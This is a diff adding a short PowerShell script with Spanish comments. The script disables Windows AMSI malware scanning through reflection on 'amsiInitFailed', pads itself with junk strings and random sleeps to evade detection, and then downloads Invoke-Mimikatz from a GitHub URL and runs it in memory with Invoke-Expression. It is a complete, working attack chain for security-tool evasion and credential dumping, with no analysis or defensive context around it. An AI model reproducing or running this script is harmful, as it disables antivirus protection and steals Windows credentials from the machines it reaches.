@@ -1,0 +1,24 @@
+$DEsyd = $null
+$A4Lk3cOwJ = "System.Management.Automation.AmsiUtils"
+
+$z = "+ + ++"
+
+[Threading.Thread]::Sleep(1726)
+
+$bindingFlags = [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
+$amsiField = [Ref].Assembly.GetType($A4Lk3cOwJ).GetField('amsiInitFailed', $bindingFlags)
+
+$amsiField.SetValue($DEsyd, $true)
+
+$zlramzpmmokwcun = "+ + + ++ + + + + + + "
+[Threading.Thread]::Sleep(856)
+
+# Forzar TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Descargar el script desde la URL
+$mimikatzUrl = "https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1"
+$mimikatzScript = Invoke-WebRequest -Uri $mimikatzUrl -UseBasicParsing
+
+# Ejecutar el contenido del script
+Invoke-Expression $mimikatzScript.Content
